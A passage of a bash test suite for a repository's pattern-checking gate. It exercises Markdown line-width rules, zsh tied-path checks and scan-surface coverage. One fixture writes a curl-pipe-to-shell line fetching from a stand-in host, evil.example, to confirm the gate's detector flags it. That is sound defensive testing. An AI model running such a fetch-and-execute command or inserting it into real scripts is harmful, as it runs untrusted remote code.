  r="$work/tied-uncaught-$(printf '%s' "$line" | cksum | sed 's/ .*//')"; seed "$r"; mkdir -p "$r/zsh"
  printf '%s\n' "$line" > "$r/zsh/x.zsh"
  [ "$(run "$r")" = "0" ] && ok || fail "documented as NOT covered, now caught - update the arm's comment and this pin: $line"
done <<'UNCAUGHT'
  local foo=$(pwd) path
  local -a arr=() path
  local x='a;b' path
  local "path"
  local p\ath
  \local path
  local {path,x}
  local mailpath
UNCAUGHT
# KNOWN FALSE POSITIVE, pinned: the shape in quoted prose followed by a space
# fires; the same prose ending at the name does not (the `"` ends the name)
r="$work/tied-fp-prose"; seed "$r"; mkdir -p "$r/zsh"
printf '%s\n' 'print "a local path here"' > "$r/zsh/x.zsh"
_fails_at "$r" "$tied_msg" "$r/zsh/x.zsh:1:" "the known false positive in quoted prose is flagged"
r="$work/tied-fp-prose-end"; seed "$r"; mkdir -p "$r/zsh"
printf '%s\n' 'print "a local path"' > "$r/zsh/x.zsh"
[ "$(run "$r")" = "0" ] && ok || fail "quoted prose ending at the name must pass"
# the pinned-plugins exclusion is the EXACT path zsh/plugins: a sibling whose
# name only starts with `plugins` is first-party and scanned
for tied_f in zsh/plugins-x/a.zsh zsh/pluginsx.zsh; do
  r="$work/tied-anchor-$(printf '%s' "$tied_f" | tr '/.' '--')"; seed "$r"
  mkdir -p "$r/$(dirname "$tied_f")"
  printf '  local path=/x\n' > "$r/$tied_f"
  _fails_at "$r" "$tied_msg" "$r/$tied_f:1:" "$tied_f is first-party, not the pinned zsh/plugins"
done
r="$work/tied-anchor-pinned"; seed "$r"; mkdir -p "$r/zsh/plugins/p"
printf '  local path=/x\n' > "$r/zsh/plugins/p/a.zsh"
[ "$(run "$r")" = "0" ] && ok || fail "the same line inside the pinned zsh/plugins/p/ must pass"
# the surface is zsh/ alone: a bash `local path` in lib/ or bin/ is bash's
r="$work/tied-surface"; seed "$r"; mkdir -p "$r/bin"
printf 'f() { local path="$1"; }\n' > "$r/lib/x.sh"
printf '#!/usr/bin/env bash\nf() { local section="$1" path="$2"; }\n' > "$r/bin/tool"
[ "$(run "$r")" = "0" ] && ok || fail "a bash local path in lib/ or bin/ is off the arm's surface"
# today's real zsh/ sources pass (the pinned plugins are not copied)
r="$work/tied-real-zsh"; seed "$r"; mkdir -p "$r/zsh"
for f in "$repo_root"/zsh/* "$repo_root"/zsh/.[!.]*; do
  [ -f "$f" ] && cat "$f" > "$r/zsh/${f##*/}"
done
[ "$(run "$r")" = "0" ] && ok || fail "today's zsh/ sources must pass the tied-path arm"
# FAIL CLOSED: the scan's grep failing exits 2
r="$work/tied-grep-fail"; seed "$r"; mkdir -p "$r/zsh"
printf 'path=(/x $path)\n' > "$r/zsh/ok.zsh"
[ "$(run "$r")" = "0" ] || fail "the tied-path grep-fault fixture must pass the real gate"
PATH="$patfail:$PATH" PAT_FAIL_ON=cdpath \
  fails_with_rc 2 "$r" "check-patterns: tied-path declaration scan errored" "a failing tied-path scan must exit 2" only

# === arm (15): Markdown prose held to 80 columns ===============================
# Every hit must be fixable by a pure reflow, so each exemption is a line a
# reflow cannot shorten (one unbreakable token) or must not touch (code,
# tables, headings, HTML, front matter). Lines are built to an exact width,
# so an off-by-one in the limit fails here.
md_msg="check-patterns: a Markdown prose line over 80 columns"
md_err_msg="check-patterns: Markdown line-width scan errored"
# _md_words N - N columns of words: "aaaa aaaa ... a", exactly N characters.
_md_words() {
  local s=""
  while [ "${#s}" -lt "$1" ]; do s="${s}aaaa "; done
  s="${s:0:$1}"
  [ "${s: -1}" != " " ] || s="${s%?}b"
  printf '%s' "$s"
}
md80="$(_md_words 80)"; md81="$(_md_words 81)"
[ "${#md80}" = 80 ] && [ "${#md81}" = 81 ] || fail "arm 15 fixture: _md_words built the wrong widths"
_md_long_token="https://example.com/$(printf 'x%.0s' $(seq 1 90))"

# exactly 80 columns passes; 81 fails and names the file and line.
r="$work/mdw-80"; seed "$r"; mkdir -p "$r/docs"
printf '%s\n' "$md80" > "$r/docs/x.md"
[ "$(run "$r")" = "0" ] && ok || fail "an 80-column prose line must pass arm 15"
r="$work/mdw-81"; seed "$r"; mkdir -p "$r/docs"
printf '# Title\n\n%s\n' "$md81" > "$r/docs/x.md"
fails_with_rc 1 "$r" "$md_msg" "an 81-column prose line must fail arm 15" only
fails_with "$r" "/docs/x.md:3:" "arm 15 names the file and line of the long line"

# width is characters, not bytes: 80 characters holding two-byte UTF-8 pass.
r="$work/mdw-utf8"; seed "$r"; mkdir -p "$r/docs"
printf '%s\n' "$(_md_words 76) $(printf '\303\251\303\251\303\251')" > "$r/docs/x.md"
[ "$(run "$r")" = "0" ] && ok || fail "arm 15 must count UTF-8 characters, not bytes"

# ... and 81 of them fail. The micro, degree and section signs sit at the
# edges of the continuation-byte range (their second bytes are 0xB5, 0xB0 and
# 0xA7), so each is one column at 80 and a violation at 81.
r="$work/mdw-utf8-81"; seed "$r"; mkdir -p "$r/docs"
printf '%s\n' "$(_md_words 77) $(printf '\303\251\303\251\303\251')" > "$r/docs/x.md"
fails_with_rc 1 "$r" "$md_msg" "81 characters holding two-byte UTF-8 must fail arm 15" only
for mb in '\302\265' '\302\260' '\302\247'; do
  r="$work/mdw-mb-80"; rm -rf "$r"; seed "$r"; mkdir -p "$r/docs"
  printf '%s\n' "$(_md_words 78) $(printf "$mb")" > "$r/docs/x.md"
  [ "$(run "$r")" = "0" ] && ok || fail "arm 15: 80 characters ending in $mb must pass"
  r="$work/mdw-mb-81"; rm -rf "$r"; seed "$r"; mkdir -p "$r/docs"
  printf '%s\n' "$(_md_words 79) $(printf "$mb")" > "$r/docs/x.md"
  fails_with_rc 1 "$r" "$md_msg" "arm 15: 81 characters ending in $mb must fail" only
done

# a CRLF file: the CR is not a column, and `---` CRLF front matter is still
# front matter.
r="$work/mdw-crlf"; seed "$r"; mkdir -p "$r/docs"
printf -- '---\r\ndescription: %s\r\n---\r\n\r\n%s\r\n' "$md81" "$md80" > "$r/docs/x.md"
[ "$(run "$r")" = "0" ] && ok || fail "arm 15: a CRLF file must pass at 80 columns, its front matter exempt"
r="$work/mdw-crlf-81"; seed "$r"; mkdir -p "$r/docs"
printf '%s\r\n' "$md81" > "$r/docs/x.md"
fails_with_rc 1 "$r" "$md_msg" "arm 15: an 81-column CRLF line must fail" only

# a TAB counts as one column (documented in the arm).
r="$work/mdw-tab"; seed "$r"; mkdir -p "$r/docs"
printf '\t%s\n' "$(_md_words 79)" > "$r/docs/x.md"
[ "$(run "$r")" = "0" ] && ok || fail "arm 15: a TAB must count as one column"

# a nested list: the indent and the marker are set aside before counting
# tokens, so a lone link there is exempt and prose there is not.
r="$work/mdw-nested-link"; seed "$r"; mkdir -p "$r/docs"
printf -- '- a\n    - [%s](%s)\n' "$md81" "$_md_long_token" > "$r/docs/x.md"
[ "$(run "$r")" = "0" ] && ok || fail "arm 15: a lone link in a nested list item must be exempt"
r="$work/mdw-nested-prose"; seed "$r"; mkdir -p "$r/docs"
printf -- '- a\n    - %s\n' "$md81" > "$r/docs/x.md"
fails_with_rc 1 "$r" "$md_msg" "arm 15: prose in a nested list item must fail" only

# an unclosed fence runs to the end of ITS file, as GitHub renders it, and
# never into the next file of the same awk run: docs/ is scanned before the
# top-level README.md, so the fence state must reset on README.md's first line.
r="$work/mdw-unclosed"; seed "$r"; mkdir -p "$r/docs"
printf '```\n%s\n' "$md81" > "$r/docs/a.md"
[ "$(run "$r")" = "0" ] && ok || fail "arm 15: the rest of a file after an unclosed fence is code"
printf '%s\n' "$md81" > "$r/README.md"
fails_with "$r" "/README.md:1:" "arm 15: an unclosed fence in one file must not exempt the next file"

# a long line of unclosed brackets stays linear: every `[` used to rescan to
# the end of the line (measured: 107 s at 60000 brackets, 11 s at 8000).
# bounded_run is sourced above, for the long-line sanitizer cases.
r="$work/mdw-brackets"; seed "$r"; mkdir -p "$r/docs"
printf 'a %s\n' "$(printf '[%.0s' $(seq 1 60000))" > "$r/docs/x.md"
bounded_run 20 "$work/mdw-brackets.out" env STRICT= "$cp" "$r" \
  || fail "arm 15 brackets: bounded_run could not turn job control on"
[ "$br_hung" = 0 ] && [ "$br_stuck" = 0 ] && ok \
  || fail "arm 15: a line of 60000 unclosed brackets outlived 20 s (hung $br_hung, stuck $br_stuck)"
[ "$br_rc" = 1 ] && ok || fail "arm 15: the unclosed-bracket line must still fail as too long, got $br_rc"

# nested brackets that DO close: every `[` used to scan to its partner, so
# 30000 of them before 30000 `]` was quadratic too (measured: 59 s). One
# pairing pass per line makes it linear.
r="$work/mdw-nested-brackets"; seed "$r"; mkdir -p "$r/docs"
printf 'a %s%s\n' "$(printf '[%.0s' $(seq 1 30000))" "$(printf ']%.0s' $(seq 1 30000))" > "$r/docs/x.md"
bounded_run 20 "$work/mdw-nested-brackets.out" env STRICT= "$cp" "$r" \
  || fail "arm 15 nested brackets: bounded_run could not turn job control on"
[ "$br_hung" = 0 ] && [ "$br_stuck" = 0 ] && ok \
  || fail "arm 15: 30000 nested bracket pairs outlived 20 s (hung $br_hung, stuck $br_stuck)"
[ "$br_rc" = 1 ] && ok || fail "arm 15: the nested-bracket line must still fail as too long, got $br_rc"

# backtick runs of every length 1..2000 (a 2 MB line), none closed. Two
# quadratic costs met here: every opener scanned the rest of the line for a
# run of its own length (mawk: 8 s at 700 runs, over 120 s at 1400), and on
# the onetrue awk (macOS) every substr() call runs strlen() over the whole
# line, so even a linear walk by substr was quadratic (a build of the macOS
# awk source: 8.5 s at 1400 runs here, past 20 s on the macOS CI runners).
# Each run's partner is now listed once per line and the walk reads a
# character array split once: about 1 s at 2000 runs on that build, 0.1 s on
# mawk.
r="$work/mdw-backtick-runs"; seed "$r"; mkdir -p "$r/docs"
python3 -I -c 'import sys; sys.stdout.write("a " + "".join("`" * k + " x " for k in range(1, 2000)) + "\n")' \
  > "$r/docs/x.md"
bounded_run 20 "$work/mdw-backtick-runs.out" env STRICT= "$cp" "$r" \
  || fail "arm 15 backtick runs: bounded_run could not turn job control on"
[ "$br_hung" = 0 ] && [ "$br_stuck" = 0 ] && ok \
  || fail "arm 15: a line of 2000 distinct backtick runs outlived 20 s (hung $br_hung, stuck $br_stuck)"
[ "$br_rc" = 1 ] && ok || fail "arm 15: the backtick-run line must still fail as too long, got $br_rc"

# How a line's links and code spans are paired. Each case is one line over
# the limit that is exempt only when it is ONE whole link or code span, so a
# pairing mistake flips its verdict. md40 is 40 columns of words.
md40="$(_md_words 40)"
i=0
while IFS='|' read -r want shape; do
  i=$((i + 1)); r="$work/mdw-pair-$i"; seed "$r"; mkdir -p "$r/docs"
  f="$r/docs/x.md"
  case "$shape" in
    image) printf '![%s](%s)\n' "$md81" "$_md_long_token" > "$f" ;;
    code-bracket) printf '[%s `]` %s](%s)\n' "$md40" "$md40" "$_md_long_token" > "$f" ;;
    escaped-bracket) printf '\\[%s](%s)\n' "$md81" "$_md_long_token" > "$f" ;;
    unclosed-paren) printf '[%s](%s\n' "$md81" "$_md_long_token" > "$f" ;;
    # the same bracket and paren positions on two lines: the first line's
    # pairs must not survive into the second, where they no longer close.
    stale-paren) printf '[%s](%s)\n[%s](%s more\n' "$md81" "$_md_long_token" "$md81" "$_md_long_token" > "$f" ;;
    stale-bracket) printf '[%s](%s)\n[%sx(%s)\n' "$md81" "$_md_long_token" "$md81" "$_md_long_token" > "$f" ;;
    stale-backtick) printf -- '- `%s`\n- `%sx\n' "$md81" "$md81" > "$f" ;;
    *) fail "arm 15: unknown pairing shape $shape" ;;
  esac
  if [ "$want" = pass ]; then
    [ "$(run "$r")" = "0" ] && ok || fail "arm 15 pairing must exempt: $shape"
  else
    fails_with_rc 1 "$r" "$md_msg" "arm 15 pairing must fail: $shape" only
    case "$shape" in stale-*) fails_with "$r" "/docs/x.md:2:" "arm 15 pairing: $shape reports line 2" ;; esac
  fi
done <<'SHAPES'
pass|image
pass|code-bracket
fail|escaped-bracket
fail|unclosed-paren
fail|stale-paren
fail|stale-bracket
fail|stale-backtick
SHAPES

# front matter that never closes is not front matter: GitHub renders the
# `---` as a rule and the rest as prose, so its lines are held to the limit
# at their own line numbers.
r="$work/mdw-fm-unclosed"; seed "$r"; mkdir -p "$r/docs"
printf -- '---\nshort\n%s\n' "$md81" > "$r/docs/x.md"
fails_with_rc 1 "$r" "$md_msg" "arm 15: an unclosed front matter must be read as prose" only
fails_with "$r" "/docs/x.md:3:" "arm 15: an unclosed front matter keeps its line numbers"
r="$work/mdw-fm-unclosed-ok"; seed "$r"; mkdir -p "$r/docs"
printf -- '---\nshort\n' > "$r/docs/x.md"
[ "$(run "$r")" = "0" ] && ok || fail "arm 15: a short unclosed front matter must pass"

# Every per-file state resets on the next file's first line, in one awk run.
# docs/ is scanned before README.md (see the unclosed-fence case above).
#   - an unclosed front matter in docs/a.md is flushed as docs/a.md's own
#     prose when README.md starts, and README.md is read as itself;
#   - an unclosed HTML comment in docs/a.md hides nothing in README.md;
#   - held front-matter lines never carry over: README.md's own unclosed
#     front matter reports nothing of docs/a.md's.
r="$work/mdw-reset-fm"; seed "$r"; mkdir -p "$r/docs"
printf -- '---\nshort\n%s\n' "$md81" > "$r/docs/a.md"
printf '%s\n' "$md81" > "$r/README.md"
fails_with "$r" "/docs/a.md:3:" "arm 15: an unclosed front matter is flushed as its own file when the next starts"
fails_with "$r" "/README.md:1:" "arm 15: the file after an unclosed front matter is read as itself"
r="$work/mdw-reset-cmt"; seed "$r"; mkdir -p "$r/docs"
printf '<!-- open\n' > "$r/docs/a.md"
printf '%s\n' "$md81" > "$r/README.md"
fails_with "$r" "/README.md:1:" "arm 15: an unclosed HTML comment must not hide the next file"
r="$work/mdw-reset-held"; seed "$r"; mkdir -p "$r/docs"
printf -- '---\n%s\n' "$md81" > "$r/docs/a.md"
printf -- '---\nshort\n' > "$r/README.md"
rc=0; out="$(STRICT= "$cp" "$r" 2>&1)" || rc=$?
case "$rc:$out" in
  *README.md:*) fail "arm 15: held front-matter lines leaked into the next file: $out" ;;
  1:*"/docs/a.md:2:"*) ok ;;
  *) fail "arm 15: expected exactly docs/a.md:2 from the held lines (exit $rc): $out" ;;
esac

# the OTHER counting path. An awk shim rewrites the probe to pick the path
# the native awk does not take (u8 inverted). Under that shim the probe
# self-test must fail the gate closed; with the self-test also removed, a
# fixture that the wrong path miscounts flips its verdict, which proves the
# probe really selects the path. On a byte-counting awk (gawk, mawk, macOS's
# onetrue awk under LC_ALL=C) a 71-character line of 60 two-byte characters
# (131 bytes) passes natively and fails on the character path. On a
# character-counting awk (the second-edition onetrue awk), an 85-character
# line holding 10 micro signs fails natively and passes on the byte path,
# which deletes U+0080-U+00BF as if they were continuation bytes.
real_awk="$(command -v awk)"
awk_shim="$work/awk-shim-width"; mkdir -p "$awk_shim"
cat > "$awk_shim/awk" <<'SHIM'
#!/usr/bin/env python3
import os, sys
args, hits = [], 0
for a in sys.argv[1:]:
    b = a.replace('u8 = (length("\\303\\251") == 1)', 'u8 = !(length("\\303\\251") == 1)')
    if os.environ.get("CPT_NO_SELFTEST"):
        b = b.replace('if (cols("\\303\\251\\302\\265\\302\\260") != 3)', "if (0)")
    hits += b != a
    args.append(b)
if not hits:
    print("awk shim: the width probe was not found in the program", file=sys.stderr)
    sys.exit(3)
os.execv(os.environ["CPT_REAL_AWK"], [os.environ["CPT_REAL_AWK"]] + args)
SHIM
chmod u+x "$awk_shim/awk"
native_len="$(LC_ALL=C "$real_awk" 'BEGIN { print length("\303\251") }')"
r="$work/mdw-charpath"; seed "$r"; mkdir -p "$r/docs"
case "$native_len" in
  2)
    printf '%s aaaaaaaaaa\n' "$(printf '\303\251%.0s' $(seq 1 60))" > "$r/docs/x.md"
    [ "$(run "$r")" = "0" ] && ok || fail "arm 15: 71 characters of two-byte UTF-8 must pass on the byte path"
    want_forced=1 ;;
  1)
    printf '%s %s\n' "$(printf '\302\265%.0s' $(seq 1 10))" "$(_md_words 74)" > "$r/docs/x.md"
    fails_with_rc 1 "$r" "$md_msg" "arm 15: 85 characters holding micro signs must fail on the character path" only
    want_forced=0 ;;
  *) fail "arm 15: the native awk's length of a two-byte character is '$native_len', not 1 or 2" ;;
esac
rc=0; out="$(PATH="$awk_shim:$PATH" CPT_REAL_AWK="$real_awk" STRICT= "$cp" "$r" 2>&1)" || rc=$?
[ "$rc" = 2 ] || fail "arm 15: a miscounting probe must fail closed (exit 2), got $rc: $out"
case "$out" in
  *"miscounts UTF-8 characters"*"$md_err_msg"*) ok ;;
  *) fail "arm 15: a miscounting probe must report the self-test and this arm's error: $out" ;;
esac
rc=0; out="$(PATH="$awk_shim:$PATH" CPT_REAL_AWK="$real_awk" CPT_NO_SELFTEST=1 STRICT= "$cp" "$r" 2>&1)" || rc=$?
[ "$rc" = "$want_forced" ] \
  || fail "arm 15: the other counting path must flip the fixture's verdict (want exit $want_forced), got $rc: $out"
case "$want_forced:$out" in
  0:*|1:*"/docs/x.md:1:"*"$md_msg"*) ok ;;
  *) fail "arm 15: the forced path must flag the 131-byte line: $out" ;;
esac

# every exempt shape passes, each over the limit and holding spaces.
i=0
while IFS= read -r shape; do
  i=$((i + 1)); r="$work/mdw-exempt-$i"; seed "$r"; mkdir -p "$r/docs"
  case "$shape" in
    fence) printf '```sh\n%s\n```\n' "$md81" > "$r/docs/x.md" ;;
    tilde-fence-in-list) printf -- '- item\n\n  ~~~~\n  %s\n  ~~~~\n' "$md81" > "$r/docs/x.md" ;;
    table) printf '| a | b |\n| --- | --- |\n| %s | x |\n' "$md81" > "$r/docs/x.md" ;;
    heading) printf '## %s\n' "$md81" > "$r/docs/x.md" ;;
    html-comment) printf '<!--\n%s\n-->\n' "$md81" > "$r/docs/x.md" ;;
    html-tag) printf '<a id="x" title="%s"></a>\n' "$md81" > "$r/docs/x.md" ;;
    front-matter) printf -- '---\ndescription: %s\n---\n\n# T\n' "$md81" > "$r/docs/x.md" ;;
    ref-def) printf '[ref]: %s "a title with spaces"\n' "$_md_long_token" > "$r/docs/x.md" ;;
    url) printf '  %s\n' "$_md_long_token" > "$r/docs/x.md" ;;
    code-span) printf -- '- `%s`.\n' "$md81" > "$r/docs/x.md" ;;
    link) printf '> [%s](%s).\n' "$md81" "$_md_long_token" > "$r/docs/x.md" ;;
    not-md) printf '%s\n' "$md81" > "$r/docs/x.txt" ;;
    code-of-conduct) printf '%s\n' "$md81" > "$r/CODE_OF_CONDUCT.md" ;;
    *) fail "arm 15: unknown exempt shape $shape" ;;
  esac
  [ "$(run "$r")" = "0" ] && ok || fail "arm 15 must exempt: $shape"
done <<'SHAPES'
fence
tilde-fence-in-list
table
heading
html-comment
html-tag
front-matter
ref-def
url
code-span
link
not-md
code-of-conduct
SHAPES

# an unbreakable token SHARING its line with other words fails: moving it to
# its own line fixes the overflow. So does prose after a CLOSED fence, and
# prose in a list item, a quote, and a Markdown file anywhere on the surface.
i=0
while IFS= read -r shape; do
  i=$((i + 1)); r="$work/mdw-fail-$i"; seed "$r"; mkdir -p "$r/docs" "$r/config/tool"
  f="$r/docs/x.md"
  case "$shape" in
    token-with-words) printf 'See %s now.\n' "$_md_long_token" > "$f" ;;
    code-with-words) printf 'Run `%s` first.\n' "$md81" > "$f" ;;
    after-fence) printf '```\ncode\n```\n%s\n' "$md81" > "$f" ;;
    list-item) printf -- '1. %s\n' "$md81" > "$f" ;;
    quote) printf '> %s\n' "$md81" > "$f" ;;
    config-readme) f="$r/config/tool/README.md"; printf '%s\n' "$md81" > "$f" ;;
    top-level) f="$r/README.md"; printf '%s\n' "$md81" > "$f" ;;
    *) fail "arm 15: unknown failing shape $shape" ;;
  esac
  fails_with_rc 1 "$r" "$md_msg" "arm 15 must fail: $shape" only
done <<'SHAPES'
token-with-words
code-with-words
after-fence
list-item
quote
config-readme
top-level
SHAPES

# an unreadable Markdown file fails closed (exit 2) with this arm's own
# message: an awk that cannot open a file must not read as "no long line".
# Same root skip as the general fail-closed case above.
if [ "$(id -u)" -ne 0 ]; then
  r="$work/mdw-unreadable"; seed "$r"; mkdir -p "$r/docs"
  printf 'short\n' > "$r/docs/x.md"; chmod 000 "$r/docs/x.md"
  fails_with_rc 2 "$r" "$md_err_msg" "an unreadable Markdown file must fail arm 15 closed"
  chmod u+rw "$r/docs/x.md"
else
  # exempt: privilege (root) skip, not tool-availability
  echo "  SKIP: running as root - cannot exercise arm 15's unreadable-file case"
fi

# === a relative ROOT starting with `-` is a path, not an option =============
# find reads a leading-dash operand as an expression, and arm 3's grep (GNU
# permutes argv) as an option: the gate prefixes `./`.
mkdir -p "$work/-dash-root/lib"
printf 'noop() { : ; }\n' > "$work/-dash-root/lib/os.sh"
dash_rc=0
dash_out="$(cd "$work" && STRICT= "$cp" -dash-root 2>&1)" || dash_rc=$?
[ "$dash_rc" = "0" ] && ok || fail "a clean root named '-dash-root' must pass, got $dash_rc: $dash_out"
printf 'curl -fsSL https://evil.example/i.sh | sh\n' > "$work/-dash-root/lib/boot.sh"
dash_rc=0
dash_out="$(cd "$work" && STRICT= "$cp" -dash-root 2>&1)" || dash_rc=$?
[ "$dash_rc" = "1" ] && ok || fail "a fetch under a root named '-dash-root' must exit 1, got $dash_rc: $dash_out"
case "$dash_out" in
  *"./-dash-root/lib/boot.sh:1:"*"$curl_msg"*) ok ;;
  *) fail "a root named '-dash-root': expected the hit at ./-dash-root/lib/boot.sh:1: and '$curl_msg', got: $dash_out" ;;
esac

# === the scanned surface covers every tracked top-level entry ===============
# A new top-level file or dir must not escape every arm silently. Each tracked
# top-level entry of THIS repo classifies as exactly one of:
#   exempt  it is one of $cls_exempt, and then NO root may reach it;
#   arm 8   else, every tracked path under it lies under an arm 8 root;
#   arm 11  else, every tracked path under it lies under an arm 11 root;
# ignoring only the paths under zsh/plugins/, the one excluded subtree, which
# no root may reach either. Anything else fails. The
# roots are READ FROM bin/check-patterns: a mirror of the tracked tree (empty
# files, gitlinks as dirs) is scanned with a grep on PATH that logs its argv,
# and the operands of arm 8's calls (the pattern holding `[sSwWbB<>]`) and of
# arm 11's recursive call (the pattern being the em dash) are the roots. No
# hand-kept copy of either list, so none can drift from the gate. The real
# repo is only listed, never scanned.
# ARM 1 (curl|sh) is asserted over the CODE surface, derived from the same
# log, never a hand-kept list: every tracked path under an arm 2 root (the
# shared install.sh, lib/, bin/, zsh/, config/, packages/, security/ and
# home/), under an arm 8 root outside tests/ (which adds the Makefile and
# .github/workflows/), or under .github/ at all, must lie under an arm 1 root;
# no arm 1 root may lie in tests/, docs/ or .claude/; and arms 1 and 2 each
# run exactly one non-recursive self-scan, of bin/check-patterns.
# NOT proven: that any OTHER arm reaches an entry. Arm 11 (em dash) is the
# widest surface; arms 5 and 6 read only the shared roots above.
cls_exempt='LICENSES COPYING CODE_OF_CONDUCT.md'
git -C "$repo_root" rev-parse --is-inside-work-tree >/dev/null 2>&1 \
  || fail "surface coverage: $repo_root is not a git work tree - cannot list the tracked entries"
cls_list="$work/cls-ls-files"
git -C "$repo_root" ls-files -s -z > "$cls_list" \
  || fail "surface coverage: git ls-files failed in $repo_root"
cls_mirror="$work/cls-mirror"; mkdir -p "$cls_mirror"
cls_paths=""
while IFS= read -r -d '' entry; do
  mode="${entry%% *}"; gpath="${entry#*$'\t'}"
  mkdir -p "$cls_mirror/$(dirname "$gpath")"
  if [ "$mode" = 160000 ]; then
    mkdir -p "$cls_mirror/$gpath"
  else
    : > "$cls_mirror/$gpath"
  fi
  cls_paths="$cls_paths$gpath"$'\n'
done < "$cls_list"
[ -n "$cls_paths" ] || fail "surface coverage: git ls-files listed nothing"

cls_shim="$work/cls-grep-shim"; mkdir -p "$cls_shim"
printf '%s\n' '#!/bin/sh' \
  '{ echo "@@CALL"; for a in "$@"; do printf "A%s\n" "$a"; done; } >> "$CLS_LOG"' \
  'exec "$CLS_GREP" "$@"' > "$cls_shim/grep"
chmod u+x "$cls_shim/grep"
[ "$(PATH="$cls_shim:$PATH" bash -c 'command -v grep')" = "$cls_shim/grep" ] \
  || fail "surface coverage: the grep shim is not the grep a fresh process resolves"
# Resolved BEFORE the PATH prefix below: bash expands prefix assignments in
# order, so a `$(command -v grep)` beside `PATH=shim:...` finds the shim, which
# then execs itself forever.
cls_grep="$(command -v grep)"
case "$cls_grep" in
  /*) [ "$cls_grep" != "$cls_shim/grep" ] || fail "surface coverage: the real grep resolved to the shim" ;;
  *) fail "surface coverage: grep does not resolve to an absolute path: '$cls_grep'" ;;
esac
cls_log="$work/cls-grep-log"; : > "$cls_log"
PATH="$cls_shim:$PATH" CLS_LOG="$cls_log" CLS_GREP="$cls_grep" STRICT= \
  "$cp" "$cls_mirror" >/dev/null 2>&1 || true

# _cls_flush - classify the call collected in cls_args, add its operands.
cls_arm8=""; cls_arm11=""; cls_n11=0
cls_arm1=""; cls_arm1_self=""; cls_arm2=""; cls_arm2_self=""
cls_arm13=""; cls_arm14=""
# Arm 1's call is told by its fetcher alternation, arm 2's by its one fixed
# pattern: a rewrite of either spelling in bin/check-patterns must update
# these two patterns in the same commit (the non-empty asserts below fail
# loudly if it does not). Both arms run a recursive call AND a non-recursive
# self-scan; `rec` tells them apart.
_cls_flush() {
  local i=0 n="${#cls_args[@]}" rec=0 kind="" a rel
  [ "$n" -gt 0 ] || return 0
  while [ "$i" -lt "$n" ]; do
    a="${cls_args[$i]}"; i=$((i + 1))
    case "$a" in
      -r* | -[!-]*r*) rec=1; continue ;;
      *'[sSwWbB<>]'*) [ "$rec" -eq 1 ] && kind=8 ;;
      "$em_dash") [ "$rec" -eq 1 ] && kind=11 ;;
      *'(curl|wget)'*) kind=1 ;;
      'uname[ ]-m') kind=2 ;;
      *'g?readlink'*) [ "$rec" -eq 1 ] && kind=13 ;;
      *'|cdpath|'*) [ "$rec" -eq 1 ] && kind=14 ;;
      *) continue ;;
    esac
    [ -n "$kind" ] && break
  done
  [ -n "$kind" ] || return 0
  [ "$kind" = 11 ] && cls_n11=$((cls_n11 + 1))
  while [ "$i" -lt "$n" ]; do
    a="${cls_args[$i]}"; i=$((i + 1))
    # arm 1 passes its other patterns as `-e PAT` after the first one
    case "$a" in
      -e) i=$((i + 1)); continue ;;
      --) continue ;;
    esac
    rel="${a#"$cls_mirror"/}"
    [ "$rel" != "$a" ] || fail "surface coverage: arm $kind operand outside the mirror: $a"
    case "$kind:$rec" in
      8:*) cls_arm8="$cls_arm8$rel"$'\n' ;;
      11:*) cls_arm11="$cls_arm11$rel"$'\n' ;;
      1:1) cls_arm1="$cls_arm1$rel"$'\n' ;;
      1:0) cls_arm1_self="$cls_arm1_self$rel"$'\n' ;;
      2:1) cls_arm2="$cls_arm2$rel"$'\n' ;;
      2:0) cls_arm2_self="$cls_arm2_self$rel"$'\n' ;;
      13:*) cls_arm13="$cls_arm13$rel"$'\n' ;;
      14:*) cls_arm14="$cls_arm14$rel"$'\n' ;;
    esac
  done
}
cls_args=()
while IFS= read -r line; do
  if [ "$line" = "@@CALL" ]; then
    _cls_flush; cls_args=()
  else
    cls_args+=("${line#A}")
  fi
done < "$cls_log"
_cls_flush
[ -n "$cls_arm8" ] || fail "surface coverage: found no arm 8 grep call in the log - the shim or the call shape changed"
[ "$cls_n11" -eq 1 ] || fail "surface coverage: expected ONE arm 11 recursive grep call, found $cls_n11"

# _cls_under PATH ROOTS - PATH is a root in ROOTS (one per line) or under one.
_cls_under() {
  local root
  while IFS= read -r root; do
    [ -n "$root" ] || continue
    case "$1" in "$root" | "$root"/*) return 0 ;; esac
  done <<<"$2"
  return 1
}
# No root is zsh/plugins, lies under it, or lies ABOVE it (zsh itself as one
# root would walk into it).
while IFS= read -r root; do
  [ -n "$root" ] || continue
  case "$root" in
    zsh/plugins | zsh/plugins/*) fail "surface coverage: a root reaches the pinned zsh/plugins: $root" ;;
  esac
  case "zsh/plugins/" in
    "$root"/*) fail "surface coverage: a root sits above the pinned zsh/plugins: $root" ;;
  esac
done <<<"$cls_arm8$cls_arm11"
cls_tops="$(printf '%s' "$cls_paths" | sed 's|/.*||' | LC_ALL=C sort -u)"
for ex in $cls_exempt; do
  case $'\n'"$cls_tops"$'\n' in
    *$'\n'"$ex"$'\n'*) ;;
    *) fail "surface coverage: exempt entry '$ex' is not tracked - drop it from the exempt set" ;;
  esac
done
while IFS= read -r top; do
  in8=1; in11=1; any=0
  while IFS= read -r p; do
    case "$p" in "$top" | "$top"/*) ;; *) continue ;; esac
    case "$p" in zsh/plugins/*) continue ;; esac
    if _cls_under "$p" "$cls_arm8"; then any=1; else in8=0; fi
    if _cls_under "$p" "$cls_arm11"; then any=1; else in11=0; fi
  done <<<"$cls_paths"
  case " $cls_exempt " in
    *" $top "*)
      [ "$any" -eq 0 ] && ok \
        || fail "surface coverage: exempt entry '$top' is now scanned - drop it from the exempt set, or keep it out of the gate" ;;
    *)
      { [ "$in8" -eq 1 ] || [ "$in11" -eq 1 ]; } && ok \
        || fail "surface coverage: tracked top-level entry '$top' is on no arm 8 or arm 11 root and is not exempt - add it to the gate's surface" ;;
  esac
done <<<"$cls_tops"

# arm 1 over the code surface (see the header of this section)
[ -n "$cls_arm1" ] || fail "surface coverage: found no arm 1 recursive grep call in the log - the shim or the call shape changed"
[ -n "$cls_arm2" ] || fail "surface coverage: found no arm 2 recursive grep call in the log - the shim or the call shape changed"
[ "$cls_arm1_self" = "bin/check-patterns"$'\n' ] && ok \
  || fail "surface coverage: arm 1 must self-scan exactly bin/check-patterns, got: $cls_arm1_self"
[ "$cls_arm2_self" = "bin/check-patterns"$'\n' ] && ok \
  || fail "surface coverage: arm 2 must self-scan exactly bin/check-patterns, got: $cls_arm2_self"
while IFS= read -r root; do
  [ -n "$root" ] || continue
  case "$root" in
    tests | tests/* | docs | docs/* | .claude | .claude/*)
      fail "surface coverage: an arm 1 root lies in tests/, docs/ or .claude/: $root" ;;
